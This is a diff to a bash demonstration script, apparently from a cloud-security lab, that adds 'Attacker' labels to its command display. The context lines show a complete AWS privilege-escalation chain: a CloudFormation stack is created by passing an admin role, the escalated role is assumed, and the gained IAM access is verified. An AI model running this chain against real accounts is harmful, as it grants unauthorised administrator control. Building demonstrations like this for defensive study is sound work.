@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -89,7 +91,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -101,7 +103,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -109,7 +111,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -165,7 +167,7 @@ echo "Admin role ARN: $ADMIN_ROLE_ARN"
 echo "Stack name: $STACK_NAME"
 echo ""
 
-show_attack_cmd "aws cloudformation create-stack --region $AWS_REGION --stack-name $STACK_NAME --template-body file://$TEMPLATE_FILE --role-arn $ADMIN_ROLE_ARN --capabilities CAPABILITY_NAMED_IAM --output text"
+show_attack_cmd "Attacker" "aws cloudformation create-stack --region $AWS_REGION --stack-name $STACK_NAME --template-body file://$TEMPLATE_FILE --role-arn $ADMIN_ROLE_ARN --capabilities CAPABILITY_NAMED_IAM --output text"
 aws cloudformation create-stack \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -186,7 +188,7 @@ WAIT_TIME=0
 STACK_COMPLETE=false
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
-    show_cmd "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].StackStatus' --output text"
+    show_cmd "Attacker" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].StackStatus' --output text"
     STACK_STATUS=$(aws cloudformation describe-stacks \
         --region $AWS_REGION \
         --stack-name $STACK_NAME \
@@ -202,7 +204,7 @@ while [ $WAIT_TIME -lt $MAX_WAIT ]; do
     elif [ "$STACK_STATUS" = "CREATE_FAILED" ] || [ "$STACK_STATUS" = "ROLLBACK_COMPLETE" ]; then
         echo -e "${RED}Error: Stack creation failed${NC}"
         echo "Stack status: $STACK_STATUS"
-        show_cmd "aws cloudformation describe-stack-events --region $AWS_REGION --stack-name $STACK_NAME --query 'StackEvents[?ResourceStatus==\`CREATE_FAILED\`]' --output table"
+        show_cmd "Attacker" "aws cloudformation describe-stack-events --region $AWS_REGION --stack-name $STACK_NAME --query 'StackEvents[?ResourceStatus==\`CREATE_FAILED\`]' --output table"
         aws cloudformation describe-stack-events \
             --region $AWS_REGION \
             --stack-name $STACK_NAME \
@@ -222,7 +224,7 @@ fi
 
 # Step 8: Get the escalated role ARN from stack outputs
 echo -e "${YELLOW}Step 8: Retrieving escalated role ARN from stack outputs${NC}"
-show_cmd "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].Outputs[?OutputKey==\`EscalatedRoleArn\`].OutputValue' --output text"
+show_cmd "Attacker" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].Outputs[?OutputKey==\`EscalatedRoleArn\`].OutputValue' --output text"
 ESCALATED_ROLE_ARN=$(aws cloudformation describe-stacks \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -246,7 +248,7 @@ echo ""
 echo "Waiting for IAM propagation (5 seconds)..."
 sleep 5
 
-show_cmd "aws sts assume-role --role-arn $ESCALATED_ROLE_ARN --role-session-name escalation-demo --query 'Credentials' --output json"
+show_cmd "Attacker" "aws sts assume-role --role-arn $ESCALATED_ROLE_ARN --role-session-name escalation-demo --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $ESCALATED_ROLE_ARN \
     --role-session-name escalation-demo \
@@ -260,7 +262,7 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we're now the escalated role
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed escalated role${NC}\n"
@@ -270,7 +272,7 @@ echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 echo ""
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
